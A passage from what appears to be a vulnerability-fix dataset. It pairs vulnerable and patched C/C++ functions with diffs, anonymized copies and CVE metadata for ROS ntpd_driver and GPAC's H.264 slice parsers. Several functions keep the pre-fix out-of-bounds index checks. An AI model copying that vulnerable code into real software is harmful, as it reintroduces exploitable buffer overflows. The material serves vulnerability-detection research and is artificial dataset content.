}",vooon/ntpd_driver/063eb917c88f8a965d4988501a4ff54441440c42/shm_driver.cpp/vul/before/0.json,"int main(int argc, char *argv[])
{
  ros::init(argc, argv, ""ntpd_shm"");

  ros::NodeHandle nh(""~"");
  ros::Subscriber time_ref_sub;

  int shm_unit;

  // Override default ROS handler
  signal(SIGINT, sig_handler);

  // Read Parameters
  nh.param(""shm_unit"", shm_unit, 2);
  nh.param(""fixup_date"", g_set_date, false);

  // Report settings
  ROS_INFO_STREAM(""NTP date fixup: "" << ((g_set_date) ? ""enabled"" : ""disabled""));

  g_shm = get_shmTime(shm_unit);
  if (g_shm == NULL)
    return 1;

  // prefer to unreliable connection, but accept tcp too.
  time_ref_sub = nh.subscribe(""time_ref"", 10, time_ref_cb,
      ros::TransportHints()
      .unreliable().maxDatagramSize(1024)
      .reliable().tcpNoDelay(true));

  ros::spin();
  put_shmTime(&g_shm);
  return 0;
}","int main(int VAR_0, char *VAR_1[])
{
  ros::init(VAR_0, VAR_1, ""ntpd_shm"");

  ros::NodeHandle VAR_2(""~"");
  ros::Subscriber VAR_3;

  int VAR_4;

  /* COMMENT_0 */
  signal(VAR_5, VAR_6);

  /* COMMENT_1 */
  VAR_2.param(""shm_unit"", VAR_4, 2);
  VAR_2.param(""fixup_date"", VAR_7, false);

  /* COMMENT_2 */
  ROS_INFO_STREAM(""NTP date fixup: "" << ((VAR_7) ? ""enabled"" : ""disabled""));

  VAR_8 = get_shmTime(VAR_4);
  if (VAR_8 == NULL)
    return 1;

  /* COMMENT_3 */
  VAR_3 = VAR_2.subscribe(""time_ref"", 10, VAR_9,
      ros::TransportHints()
      .unreliable().maxDatagramSize(1024)
      .reliable().tcpNoDelay(true));

  ros::spin();
  put_shmTime(&VAR_8);
  return 0;
}",vooon/ntpd_driver/063eb917c88f8a965d4988501a4ff54441440c42/shm_driver.cpp/vul/after/0.json,"--- func_before
+++ func_after
@@ -6,7 +6,6 @@
   ros::Subscriber time_ref_sub;
 
   int shm_unit;
-  std::string time_ref_topic;
 
   // Override default ROS handler
   signal(SIGINT, sig_handler);
@@ -14,10 +13,8 @@
   // Read Parameters
   nh.param(""shm_unit"", shm_unit, 2);
   nh.param(""fixup_date"", g_set_date, false);
-  nh.param<std::string>(""time_ref_topic"", time_ref_topic, ""time_ref"");
 
   // Report settings
-  ROS_INFO_STREAM(""NTP time source: "" << ros::names::resolve(time_ref_topic, true));
   ROS_INFO_STREAM(""NTP date fixup: "" << ((g_set_date) ? ""enabled"" : ""disabled""));
 
   g_shm = get_shmTime(shm_unit);
@@ -25,7 +22,7 @@
     return 1;
 
   // prefer to unreliable connection, but accept tcp too.
-  time_ref_sub = nh.subscribe(time_ref_topic, 10, time_ref_cb,
+  time_ref_sub = nh.subscribe(""time_ref"", 10, time_ref_cb,
       ros::TransportHints()
       .unreliable().maxDatagramSize(1024)
       .reliable().tcpNoDelay(true));","{'deleted_lines': ['  std::string time_ref_topic;', '  nh.param<std::string>(""time_ref_topic"", time_ref_topic, ""time_ref"");', '  ROS_INFO_STREAM(""NTP time source: "" << ros::names::resolve(time_ref_topic, true));', '  time_ref_sub = nh.subscribe(time_ref_topic, 10, time_ref_cb,'], 'added_lines': ['  time_ref_sub = nh.subscribe(""time_ref"", 10, time_ref_cb,']}",True,"The ntpd_driver component before 1.3.0 and 2.x before 2.2.0 for Robot Operating System (ROS) allows attackers, who control the source code of a different node in the same ROS application, to change a robot's behavior. This occurs because a topic name depends on the attacker-controlled time_ref_topic parameter.",9.8,CRITICAL,3,valid,2022-12-30T11:20:15Z,4
CVE-2023-23143,['CWE-120'],CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H,1,gpac,fixed #2366,af6a5e7a96ee01a139cce6c9e4edfc069aad17a6,https://github.com/gpac/gpac/commit/af6a5e7a96ee01a139cce6c9e4edfc069aad17a6,src/media_tools/av_parsers.c,avc_parse_slice,"static s32 avc_parse_slice(GF_BitStream *bs, AVCState *avc, Bool svc_idr_flag, AVCSliceInfo *si)
{
s32 pps_id, num_ref_idx_l0_active_minus1 = 0, num_ref_idx_l1_active_minus1 = 0;
gf_bs_read_ue_log(bs, ""first_mb_in_slice"");
si->slice_type = gf_bs_read_ue_log(bs, ""slice_type"");
if (si->slice_type > 9) return -1;
pps_id = gf_bs_read_ue_log(bs, ""pps_id"");
if ((pps_id<0) || (pps_id > 255)) return -1;
si->pps = &avc->pps[pps_id];
if (!si->pps->slice_group_count) return -2;
if (si->pps->sps_id>=255) return -1;
si->sps = &avc->sps[si->pps->sps_id];
if (!si->sps->log2_max_frame_num) return -2;
avc->sps_active_idx = si->pps->sps_id;
avc->pps_active_idx = pps_id;
si->frame_num = gf_bs_read_int_log(bs, si->sps->log2_max_frame_num, ""frame_num"");
si->field_pic_flag = 0;
si->bottom_field_flag = 0;
if (!si->sps->frame_mbs_only_flag) {
si->field_pic_flag = gf_bs_read_int_log(bs, 1, ""field_pic_flag"");
if (si->field_pic_flag)
si->bottom_field_flag = gf_bs_read_int_log(bs, 1, ""bottom_field_flag"");
}
if ((si->nal_unit_type == GF_AVC_NALU_IDR_SLICE) || svc_idr_flag)
si->idr_pic_id = gf_bs_read_ue_log(bs, ""idr_pic_id"");
if (si->sps->poc_type == 0) {
si->poc_lsb = gf_bs_read_int_log(bs, si->sps->log2_max_poc_lsb, ""poc_lsb"");
if (si->pps->pic_order_present && !si->field_pic_flag) {
si->delta_poc_bottom = gf_bs_read_se_log(bs, ""poc_lsb"");
}
}
else if ((si->sps->poc_type == 1) && !si->sps->delta_pic_order_always_zero_flag) {
si->delta_poc[0] = gf_bs_read_se_log(bs, ""delta_poc0"");
if ((si->pps->pic_order_present == 1) && !si->field_pic_flag)
si->delta_poc[1] = gf_bs_read_se_log(bs, ""delta_poc1"");
}
if (si->pps->redundant_pic_cnt_present) {
si->redundant_pic_cnt = gf_bs_read_ue_log(bs, ""redundant_pic_cnt"");
}
if (si->slice_type % 5 == GF_AVC_TYPE_B) {
gf_bs_read_int_log(bs, 1, ""direct_spatial_mv_pred_flag"");
}
num_ref_idx_l0_active_minus1 = si->pps->num_ref_idx_l0_default_active_minus1;
num_ref_idx_l1_active_minus1 = si->pps->num_ref_idx_l1_default_active_minus1;
if (si->slice_type % 5 == GF_AVC_TYPE_P || si->slice_type % 5 == GF_AVC_TYPE_SP || si->slice_type % 5 == GF_AVC_TYPE_B) {
Bool num_ref_idx_active_override_flag = gf_bs_read_int_log(bs, 1, ""num_ref_idx_active_override_flag"");
if (num_ref_idx_active_override_flag) {
num_ref_idx_l0_active_minus1 = gf_bs_read_ue_log(bs, ""num_ref_idx_l0_active_minus1"");
if (si->slice_type % 5 == GF_AVC_TYPE_B) {
num_ref_idx_l1_active_minus1 = gf_bs_read_ue_log(bs, ""num_ref_idx_l1_active_minus1"");
}
}
}
if (si->nal_unit_type == 20 || si->nal_unit_type == 21) {
GF_LOG(GF_LOG_ERROR, GF_LOG_CODING, (""[avc-h264] unimplemented ref_pic_list_mvc_modification() in slide header\n""));
assert(0);
return -1;
}
else {
ref_pic_list_modification(bs, si->slice_type);
}
if ((si->pps->weighted_pred_flag && (si->slice_type % 5 == GF_AVC_TYPE_P || si->slice_type % 5 == GF_AVC_TYPE_SP))
|| (si->pps->weighted_bipred_idc == 1 && si->slice_type % 5 == GF_AVC_TYPE_B)) {
avc_pred_weight_table(bs, si->slice_type, si->sps->ChromaArrayType, num_ref_idx_l0_active_minus1, num_ref_idx_l1_active_minus1);
}
if (si->nal_ref_idc != 0) {
dec_ref_pic_marking(bs, (si->nal_unit_type == GF_AVC_NALU_IDR_SLICE));
}
if (si->pps->entropy_coding_mode_flag && si->slice_type % 5 != GF_AVC_TYPE_I && si->slice_type % 5 != GF_AVC_TYPE_SI) {
gf_bs_read_ue_log(bs, ""cabac_init_idc"");
}
gf_bs_read_se(bs);
if (si->slice_type % 5 == GF_AVC_TYPE_SP || si->slice_type % 5 == GF_AVC_TYPE_SI) {
if (si->slice_type % 5 == GF_AVC_TYPE_SP) {
gf_bs_read_int_log(bs, 1, ""sp_for_switch_flag"");
}
gf_bs_read_se_log(bs, ""slice_qs_delta"");
}
if (si->pps->deblocking_filter_control_present_flag) {
if (gf_bs_read_ue_log(bs, ""disable_deblocking_filter_idc"") != 1) {
gf_bs_read_se_log(bs, ""slice_alpha_c0_offset_div2"");
gf_bs_read_se_log(bs, ""slice_beta_offset_div2"");
}
}
if (si->pps->slice_group_count > 1 && si->pps->mb_slice_group_map_type >= 3 && si->pps->mb_slice_group_map_type <= 5) {
gf_bs_read_int_log(bs, (u32)ceil(log1p((si->pps->pic_size_in_map_units_minus1 + 1) / (si->pps->slice_group_change_rate_minus1 + 1) ) / log(2)), ""slice_group_change_cycle"");
}
return 0;
}","static s32 avc_parse_slice(GF_BitStream *VAR_0, AVCState *VAR_1, Bool VAR_2, AVCSliceInfo *VAR_3)
{
s32 VAR_4, VAR_5 = 0, VAR_6 = 0;
gf_bs_read_ue_log(VAR_0, ""first_mb_in_slice"");
VAR_3->slice_type = gf_bs_read_ue_log(VAR_0, ""slice_type"");
if (VAR_3->slice_type > 9) return -1;
VAR_4 = gf_bs_read_ue_log(VAR_0, ""pps_id"");
if ((VAR_4<0) || (VAR_4 > 255)) return -1;
VAR_3->pps = &VAR_1->pps[VAR_4];
if (!VAR_3->pps->slice_group_count) return -2;
if (VAR_3->pps->sps_id>=255) return -1;
VAR_3->sps = &VAR_1->sps[VAR_3->pps->sps_id];
if (!VAR_3->sps->log2_max_frame_num) return -2;
VAR_1->sps_active_idx = VAR_3->pps->sps_id;
VAR_1->pps_active_idx = VAR_4;
VAR_3->frame_num = gf_bs_read_int_log(VAR_0, VAR_3->sps->log2_max_frame_num, ""frame_num"");
VAR_3->field_pic_flag = 0;
VAR_3->bottom_field_flag = 0;
if (!VAR_3->sps->frame_mbs_only_flag) {
VAR_3->field_pic_flag = gf_bs_read_int_log(VAR_0, 1, ""field_pic_flag"");
if (VAR_3->field_pic_flag)
VAR_3->bottom_field_flag = gf_bs_read_int_log(VAR_0, 1, ""bottom_field_flag"");
}
if ((VAR_3->nal_unit_type == VAR_7) || VAR_2)
VAR_3->idr_pic_id = gf_bs_read_ue_log(VAR_0, ""idr_pic_id"");
if (VAR_3->sps->poc_type == 0) {
VAR_3->poc_lsb = gf_bs_read_int_log(VAR_0, VAR_3->sps->log2_max_poc_lsb, ""poc_lsb"");
if (VAR_3->pps->pic_order_present && !VAR_3->field_pic_flag) {
VAR_3->delta_poc_bottom = gf_bs_read_se_log(VAR_0, ""poc_lsb"");
}
}
else if ((VAR_3->sps->poc_type == 1) && !VAR_3->sps->delta_pic_order_always_zero_flag) {
VAR_3->delta_poc[0] = gf_bs_read_se_log(VAR_0, ""delta_poc0"");
if ((VAR_3->pps->pic_order_present == 1) && !VAR_3->field_pic_flag)
VAR_3->delta_poc[1] = gf_bs_read_se_log(VAR_0, ""delta_poc1"");
}
if (VAR_3->pps->redundant_pic_cnt_present) {
VAR_3->redundant_pic_cnt = gf_bs_read_ue_log(VAR_0, ""redundant_pic_cnt"");
}
if (VAR_3->slice_type % 5 == VAR_8) {
gf_bs_read_int_log(VAR_0, 1, ""direct_spatial_mv_pred_flag"");
}
VAR_5 = VAR_3->pps->num_ref_idx_l0_default_active_minus1;
VAR_6 = VAR_3->pps->num_ref_idx_l1_default_active_minus1;
if (VAR_3->slice_type % 5 == VAR_9 || VAR_3->slice_type % 5 == VAR_10 || VAR_3->slice_type % 5 == VAR_8) {
Bool VAR_11 = gf_bs_read_int_log(VAR_0, 1, ""num_ref_idx_active_override_flag"");
if (VAR_11) {
VAR_5 = gf_bs_read_ue_log(VAR_0, ""num_ref_idx_l0_active_minus1"");
if (VAR_3->slice_type % 5 == VAR_8) {
VAR_6 = gf_bs_read_ue_log(VAR_0, ""num_ref_idx_l1_active_minus1"");
}
}
}
if (VAR_3->nal_unit_type == 20 || VAR_3->nal_unit_type == 21) {
GF_LOG(VAR_12, VAR_13, (""[avc-h264] unimplemented ref_pic_list_mvc_modification() in slide header\n""));
assert(0);
return -1;
}
else {
ref_pic_list_modification(VAR_0, VAR_3->slice_type);
}
if ((VAR_3->pps->weighted_pred_flag && (VAR_3->slice_type % 5 == VAR_9 || VAR_3->slice_type % 5 == VAR_10))
|| (VAR_3->pps->weighted_bipred_idc == 1 && VAR_3->slice_type % 5 == VAR_8)) {
avc_pred_weight_table(VAR_0, VAR_3->slice_type, VAR_3->sps->ChromaArrayType, VAR_5, VAR_6);
}
if (VAR_3->nal_ref_idc != 0) {
dec_ref_pic_marking(VAR_0, (VAR_3->nal_unit_type == VAR_7));
}
if (VAR_3->pps->entropy_coding_mode_flag && VAR_3->slice_type % 5 != VAR_14 && VAR_3->slice_type % 5 != VAR_15) {
gf_bs_read_ue_log(VAR_0, ""cabac_init_idc"");
}
gf_bs_read_se(VAR_0);
if (VAR_3->slice_type % 5 == VAR_10 || VAR_3->slice_type % 5 == VAR_15) {
if (VAR_3->slice_type % 5 == VAR_10) {
gf_bs_read_int_log(VAR_0, 1, ""sp_for_switch_flag"");
}
gf_bs_read_se_log(VAR_0, ""slice_qs_delta"");
}
if (VAR_3->pps->deblocking_filter_control_present_flag) {
if (gf_bs_read_ue_log(VAR_0, ""disable_deblocking_filter_idc"") != 1) {
gf_bs_read_se_log(VAR_0, ""slice_alpha_c0_offset_div2"");
gf_bs_read_se_log(VAR_0, ""slice_beta_offset_div2"");
}
}
if (VAR_3->pps->slice_group_count > 1 && VAR_3->pps->mb_slice_group_map_type >= 3 && VAR_3->pps->mb_slice_group_map_type <= 5) {
gf_bs_read_int_log(VAR_0, (u32)ceil(log1p((VAR_3->pps->pic_size_in_map_units_minus1 + 1) / (VAR_3->pps->slice_group_change_rate_minus1 + 1) ) / log(2)), ""slice_group_change_cycle"");
}
return 0;
}",gpac/af6a5e7a96ee01a139cce6c9e4edfc069aad17a6/av_parsers.c/vul/before/0.json,"static s32 avc_parse_slice(GF_BitStream *bs, AVCState *avc, Bool svc_idr_flag, AVCSliceInfo *si)
{
	s32 pps_id, num_ref_idx_l0_active_minus1 = 0, num_ref_idx_l1_active_minus1 = 0;

	/*s->current_picture.reference= h->nal_ref_idc != 0;*/
	gf_bs_read_ue_log(bs, ""first_mb_in_slice"");
	si->slice_type = gf_bs_read_ue_log(bs, ""slice_type"");
	if (si->slice_type > 9) return -1;

	pps_id = gf_bs_read_ue_log(bs, ""pps_id"");
	if ((pps_id<0) || (pps_id >= 255)) return -1;
	si->pps = &avc->pps[pps_id];
	if (!si->pps->slice_group_count) return -2;
	if (si->pps->sps_id>=32) return -1;
	si->sps = &avc->sps[si->pps->sps_id];
	if (!si->sps->log2_max_frame_num) return -2;
	avc->sps_active_idx = si->pps->sps_id;
	avc->pps_active_idx = pps_id;

	si->frame_num = gf_bs_read_int_log(bs, si->sps->log2_max_frame_num, ""frame_num"");

	si->field_pic_flag = 0;
	si->bottom_field_flag = 0;
	if (!si->sps->frame_mbs_only_flag) {
		si->field_pic_flag = gf_bs_read_int_log(bs, 1, ""field_pic_flag"");
		if (si->field_pic_flag)
			si->bottom_field_flag = gf_bs_read_int_log(bs, 1, ""bottom_field_flag"");
	}

	if ((si->nal_unit_type == GF_AVC_NALU_IDR_SLICE) || svc_idr_flag)
		si->idr_pic_id = gf_bs_read_ue_log(bs, ""idr_pic_id"");

	if (si->sps->poc_type == 0) {
		si->poc_lsb = gf_bs_read_int_log(bs, si->sps->log2_max_poc_lsb, ""poc_lsb"");
		if (si->pps->pic_order_present && !si->field_pic_flag) {
			si->delta_poc_bottom = gf_bs_read_se_log(bs, ""poc_lsb"");
		}
	}
	else if ((si->sps->poc_type == 1) && !si->sps->delta_pic_order_always_zero_flag) {
		si->delta_poc[0] = gf_bs_read_se_log(bs, ""delta_poc0"");
		if ((si->pps->pic_order_present == 1) && !si->field_pic_flag)
			si->delta_poc[1] = gf_bs_read_se_log(bs, ""delta_poc1"");
	}

	if (si->pps->redundant_pic_cnt_present) {
		si->redundant_pic_cnt = gf_bs_read_ue_log(bs, ""redundant_pic_cnt"");
	}

	if (si->slice_type % 5 == GF_AVC_TYPE_B) {
		gf_bs_read_int_log(bs, 1, ""direct_spatial_mv_pred_flag"");
	}

	num_ref_idx_l0_active_minus1 = si->pps->num_ref_idx_l0_default_active_minus1;
	num_ref_idx_l1_active_minus1 = si->pps->num_ref_idx_l1_default_active_minus1;

	if (si->slice_type % 5 == GF_AVC_TYPE_P || si->slice_type % 5 == GF_AVC_TYPE_SP || si->slice_type % 5 == GF_AVC_TYPE_B) {
		Bool num_ref_idx_active_override_flag = gf_bs_read_int_log(bs, 1, ""num_ref_idx_active_override_flag"");
		if (num_ref_idx_active_override_flag) {
			num_ref_idx_l0_active_minus1 = gf_bs_read_ue_log(bs, ""num_ref_idx_l0_active_minus1"");
			if (si->slice_type % 5 == GF_AVC_TYPE_B) {
				num_ref_idx_l1_active_minus1 = gf_bs_read_ue_log(bs, ""num_ref_idx_l1_active_minus1"");
			}
		}
	}

	if (si->nal_unit_type == 20 || si->nal_unit_type == 21) {
		//ref_pic_list_mvc_modification(); /* specified in Annex H */
		GF_LOG(GF_LOG_ERROR, GF_LOG_CODING, (""[avc-h264] unimplemented ref_pic_list_mvc_modification() in slide header\n""));
		assert(0);
		return -1;
	}
	else {
		ref_pic_list_modification(bs, si->slice_type);
	}

	if ((si->pps->weighted_pred_flag && (si->slice_type % 5 == GF_AVC_TYPE_P || si->slice_type % 5 == GF_AVC_TYPE_SP))
		|| (si->pps->weighted_bipred_idc == 1 && si->slice_type % 5 == GF_AVC_TYPE_B)) {
		avc_pred_weight_table(bs, si->slice_type, si->sps->ChromaArrayType, num_ref_idx_l0_active_minus1, num_ref_idx_l1_active_minus1);
	}

	if (si->nal_ref_idc != 0) {
		dec_ref_pic_marking(bs, (si->nal_unit_type == GF_AVC_NALU_IDR_SLICE));
	}

	if (si->pps->entropy_coding_mode_flag && si->slice_type % 5 != GF_AVC_TYPE_I && si->slice_type % 5 != GF_AVC_TYPE_SI) {
		gf_bs_read_ue_log(bs, ""cabac_init_idc"");
	}

	/*slice_qp_delta = */gf_bs_read_se(bs);
	if (si->slice_type % 5 == GF_AVC_TYPE_SP || si->slice_type % 5 == GF_AVC_TYPE_SI) {
		if (si->slice_type % 5 == GF_AVC_TYPE_SP) {
			gf_bs_read_int_log(bs, 1, ""sp_for_switch_flag"");
		}
		gf_bs_read_se_log(bs, ""slice_qs_delta"");
	}

	if (si->pps->deblocking_filter_control_present_flag) {
		if (gf_bs_read_ue_log(bs, ""disable_deblocking_filter_idc"") != 1) {
			gf_bs_read_se_log(bs, ""slice_alpha_c0_offset_div2"");
			gf_bs_read_se_log(bs, ""slice_beta_offset_div2"");
		}
	}

	if (si->pps->slice_group_count > 1 && si->pps->mb_slice_group_map_type >= 3 && si->pps->mb_slice_group_map_type <= 5) {
		gf_bs_read_int_log(bs, (u32)ceil(log1p((si->pps->pic_size_in_map_units_minus1 + 1) / (si->pps->slice_group_change_rate_minus1 + 1) ) / log(2)), ""slice_group_change_cycle"");
	}
	return 0;
}","static s32 avc_parse_slice(GF_BitStream *VAR_0, AVCState *VAR_1, Bool VAR_2, AVCSliceInfo *VAR_3)
{
	s32 VAR_4, VAR_5 = 0, VAR_6 = 0;

	/* COMMENT_0 */
	gf_bs_read_ue_log(VAR_0, ""first_mb_in_slice"");
	VAR_3->slice_type = gf_bs_read_ue_log(VAR_0, ""slice_type"");
	if (VAR_3->slice_type > 9) return -1;

	VAR_4 = gf_bs_read_ue_log(VAR_0, ""pps_id"");
	if ((VAR_4<0) || (VAR_4 >= 255)) return -1;
	VAR_3->pps = &VAR_1->pps[VAR_4];
	if (!VAR_3->pps->slice_group_count) return -2;
	if (VAR_3->pps->sps_id>=32) return -1;
	VAR_3->sps = &VAR_1->sps[VAR_3->pps->sps_id];
	if (!VAR_3->sps->log2_max_frame_num) return -2;
	VAR_1->sps_active_idx = VAR_3->pps->sps_id;
	VAR_1->pps_active_idx = VAR_4;

	VAR_3->frame_num = gf_bs_read_int_log(VAR_0, VAR_3->sps->log2_max_frame_num, ""frame_num"");

	VAR_3->field_pic_flag = 0;
	VAR_3->bottom_field_flag = 0;
	if (!VAR_3->sps->frame_mbs_only_flag) {
		VAR_3->field_pic_flag = gf_bs_read_int_log(VAR_0, 1, ""field_pic_flag"");
		if (VAR_3->field_pic_flag)
			VAR_3->bottom_field_flag = gf_bs_read_int_log(VAR_0, 1, ""bottom_field_flag"");
	}

	if ((VAR_3->nal_unit_type == VAR_7) || VAR_2)
		VAR_3->idr_pic_id = gf_bs_read_ue_log(VAR_0, ""idr_pic_id"");

	if (VAR_3->sps->poc_type == 0) {
		VAR_3->poc_lsb = gf_bs_read_int_log(VAR_0, VAR_3->sps->log2_max_poc_lsb, ""poc_lsb"");
		if (VAR_3->pps->pic_order_present && !VAR_3->field_pic_flag) {
			VAR_3->delta_poc_bottom = gf_bs_read_se_log(VAR_0, ""poc_lsb"");
		}
	}
	else if ((VAR_3->sps->poc_type == 1) && !VAR_3->sps->delta_pic_order_always_zero_flag) {
		VAR_3->delta_poc[0] = gf_bs_read_se_log(VAR_0, ""delta_poc0"");
		if ((VAR_3->pps->pic_order_present == 1) && !VAR_3->field_pic_flag)
			VAR_3->delta_poc[1] = gf_bs_read_se_log(VAR_0, ""delta_poc1"");
	}

	if (VAR_3->pps->redundant_pic_cnt_present) {
		VAR_3->redundant_pic_cnt = gf_bs_read_ue_log(VAR_0, ""redundant_pic_cnt"");
	}

	if (VAR_3->slice_type % 5 == VAR_8) {
		gf_bs_read_int_log(VAR_0, 1, ""direct_spatial_mv_pred_flag"");
	}

	VAR_5 = VAR_3->pps->num_ref_idx_l0_default_active_minus1;
	VAR_6 = VAR_3->pps->num_ref_idx_l1_default_active_minus1;

	if (VAR_3->slice_type % 5 == VAR_9 || VAR_3->slice_type % 5 == VAR_10 || VAR_3->slice_type % 5 == VAR_8) {
		Bool VAR_11 = gf_bs_read_int_log(VAR_0, 1, ""num_ref_idx_active_override_flag"");
		if (VAR_11) {
			VAR_5 = gf_bs_read_ue_log(VAR_0, ""num_ref_idx_l0_active_minus1"");
			if (VAR_3->slice_type % 5 == VAR_8) {
				VAR_6 = gf_bs_read_ue_log(VAR_0, ""num_ref_idx_l1_active_minus1"");
			}
		}
	}

	if (VAR_3->nal_unit_type == 20 || VAR_3->nal_unit_type == 21) {
		/* COMMENT_1 */
		GF_LOG(VAR_12, VAR_13, (""[avc-h264] unimplemented ref_pic_list_mvc_modification() in slide header\n""));
		assert(0);
		return -1;
	}
	else {
		ref_pic_list_modification(VAR_0, VAR_3->slice_type);
	}

	if ((VAR_3->pps->weighted_pred_flag && (VAR_3->slice_type % 5 == VAR_9 || VAR_3->slice_type % 5 == VAR_10))
		|| (VAR_3->pps->weighted_bipred_idc == 1 && VAR_3->slice_type % 5 == VAR_8)) {
		avc_pred_weight_table(VAR_0, VAR_3->slice_type, VAR_3->sps->ChromaArrayType, VAR_5, VAR_6);
	}

	if (VAR_3->nal_ref_idc != 0) {
		dec_ref_pic_marking(VAR_0, (VAR_3->nal_unit_type == VAR_7));
	}

	if (VAR_3->pps->entropy_coding_mode_flag && VAR_3->slice_type % 5 != VAR_14 && VAR_3->slice_type % 5 != VAR_15) {
		gf_bs_read_ue_log(VAR_0, ""cabac_init_idc"");
	}

	/* COMMENT_2 */gf_bs_read_se(VAR_0);
	if (VAR_3->slice_type % 5 == VAR_10 || VAR_3->slice_type % 5 == VAR_15) {
		if (VAR_3->slice_type % 5 == VAR_10) {
			gf_bs_read_int_log(VAR_0, 1, ""sp_for_switch_flag"");
		}
		gf_bs_read_se_log(VAR_0, ""slice_qs_delta"");
	}

	if (VAR_3->pps->deblocking_filter_control_present_flag) {
		if (gf_bs_read_ue_log(VAR_0, ""disable_deblocking_filter_idc"") != 1) {
			gf_bs_read_se_log(VAR_0, ""slice_alpha_c0_offset_div2"");
			gf_bs_read_se_log(VAR_0, ""slice_beta_offset_div2"");
		}
	}

	if (VAR_3->pps->slice_group_count > 1 && VAR_3->pps->mb_slice_group_map_type >= 3 && VAR_3->pps->mb_slice_group_map_type <= 5) {
		gf_bs_read_int_log(VAR_0, (u32)ceil(log1p((VAR_3->pps->pic_size_in_map_units_minus1 + 1) / (VAR_3->pps->slice_group_change_rate_minus1 + 1) ) / log(2)), ""slice_group_change_cycle"");
	}
	return 0;
}",gpac/af6a5e7a96ee01a139cce6c9e4edfc069aad17a6/av_parsers.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -8,10 +8,10 @@
 	if (si->slice_type > 9) return -1;
 
 	pps_id = gf_bs_read_ue_log(bs, ""pps_id"");
-	if ((pps_id<0) || (pps_id > 255)) return -1;
+	if ((pps_id<0) || (pps_id >= 255)) return -1;
 	si->pps = &avc->pps[pps_id];
 	if (!si->pps->slice_group_count) return -2;
-	if (si->pps->sps_id>=255) return -1;
+	if (si->pps->sps_id>=32) return -1;
 	si->sps = &avc->sps[si->pps->sps_id];
 	if (!si->sps->log2_max_frame_num) return -2;
 	avc->sps_active_idx = si->pps->sps_id;","{'deleted_lines': ['\tif ((pps_id<0) || (pps_id > 255)) return -1;', '\tif (si->pps->sps_id>=255) return -1;'], 'added_lines': ['\tif ((pps_id<0) || (pps_id >= 255)) return -1;', '\tif (si->pps->sps_id>=32) return -1;']}",True,Buffer overflow vulnerability in function avc_parse_slice in file media_tools/av_parsers.c. GPAC version 2.3-DEV-rev1-g4669ba229-master.,7.8,HIGH,2,valid,2023-01-04T09:56:03Z,4
CVE-2023-23143,['CWE-120'],CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H,1,gpac,fixed #2366,af6a5e7a96ee01a139cce6c9e4edfc069aad17a6,https://github.com/gpac/gpac/commit/af6a5e7a96ee01a139cce6c9e4edfc069aad17a6,src/media_tools/av_parsers.c,svc_parse_slice,"static s32 svc_parse_slice(GF_BitStream *bs, AVCState *avc, AVCSliceInfo *si)
{
s32 pps_id;
gf_bs_read_ue_log(bs, ""first_mb_in_slice"");
si->slice_type = gf_bs_read_ue_log(bs, ""slice_type"");
if (si->slice_type > 9) return -1;
pps_id = gf_bs_read_ue_log(bs, ""pps_id"");
if ((pps_id<0) || (pps_id > 255))
return -1;
si->pps = &avc->pps[pps_id];
si->pps->id = pps_id;
if (!si->pps->slice_group_count)
return -2;
si->sps = &avc->sps[si->pps->sps_id + GF_SVC_SSPS_ID_SHIFT];
if (!si->sps->log2_max_frame_num)
return -2;
si->frame_num = gf_bs_read_int_log(bs, si->sps->log2_max_frame_num, ""frame_num"");
si->field_pic_flag = 0;
if (si->sps->frame_mbs_only_flag) {
}
else {
si->field_pic_flag = gf_bs_read_int_log(bs, 1, ""field_pic_flag"");
if (si->field_pic_flag) si->bottom_field_flag = gf_bs_read_int_log(bs, 1, ""bottom_field_flag"");
}
if (si->nal_unit_type == GF_AVC_NALU_IDR_SLICE || si->svc_nalhdr.idr_pic_flag)
si->idr_pic_id = gf_bs_read_ue_log(bs, ""idr_pic_id"");
if (si->sps->poc_type == 0) {
si->poc_lsb = gf_bs_read_int_log(bs, si->sps->log2_max_poc_lsb, ""poc_lsb"");
if (si->pps->pic_order_present && !si->field_pic_flag) {
si->delta_poc_bottom = gf_bs_read_se_log(bs, ""delta_poc_bottom"");
}
}
else if ((si->sps->poc_type == 1) && !si->sps->delta_pic_order_always_zero_flag) {
si->delta_poc[0] = gf_bs_read_se_log(bs, ""delta_poc0"");
if ((si->pps->pic_order_present == 1) && !si->field_pic_flag)
si->delta_poc[1] = gf_bs_read_se_log(bs, ""delta_poc1"");
}
if (si->pps->redundant_pic_cnt_present) {
si->redundant_pic_cnt = gf_bs_read_ue_log(bs, ""redundant_pic_cnt"");
}
return 0;
}","static s32 svc_parse_slice(GF_BitStream *VAR_0, AVCState *VAR_1, AVCSliceInfo *VAR_2)
{
s32 VAR_3;
gf_bs_read_ue_log(VAR_0, ""first_mb_in_slice"");
VAR_2->slice_type = gf_bs_read_ue_log(VAR_0, ""slice_type"");
if (VAR_2->slice_type > 9) return -1;
VAR_3 = gf_bs_read_ue_log(VAR_0, ""pps_id"");
if ((VAR_3<0) || (VAR_3 > 255))
return -1;
VAR_2->pps = &VAR_1->pps[VAR_3];
VAR_2->pps->id = VAR_3;
if (!VAR_2->pps->slice_group_count)
return -2;
VAR_2->sps = &VAR_1->sps[VAR_2->pps->sps_id + VAR_4];
if (!VAR_2->sps->log2_max_frame_num)
return -2;
VAR_2->frame_num = gf_bs_read_int_log(VAR_0, VAR_2->sps->log2_max_frame_num, ""frame_num"");
VAR_2->field_pic_flag = 0;
if (VAR_2->sps->frame_mbs_only_flag) {
}
else {
VAR_2->field_pic_flag = gf_bs_read_int_log(VAR_0, 1, ""field_pic_flag"");
if (VAR_2->field_pic_flag) VAR_2->bottom_field_flag = gf_bs_read_int_log(VAR_0, 1, ""bottom_field_flag"");
}
if (VAR_2->nal_unit_type == VAR_5 || VAR_2->svc_nalhdr.idr_pic_flag)
VAR_2->idr_pic_id = gf_bs_read_ue_log(VAR_0, ""idr_pic_id"");
if (VAR_2->sps->poc_type == 0) {
VAR_2->poc_lsb = gf_bs_read_int_log(VAR_0, VAR_2->sps->log2_max_poc_lsb, ""poc_lsb"");
if (VAR_2->pps->pic_order_present && !VAR_2->field_pic_flag) {
VAR_2->delta_poc_bottom = gf_bs_read_se_log(VAR_0, ""delta_poc_bottom"");
}
}
else if ((VAR_2->sps->poc_type == 1) && !VAR_2->sps->delta_pic_order_always_zero_flag) {
VAR_2->delta_poc[0] = gf_bs_read_se_log(VAR_0, ""delta_poc0"");
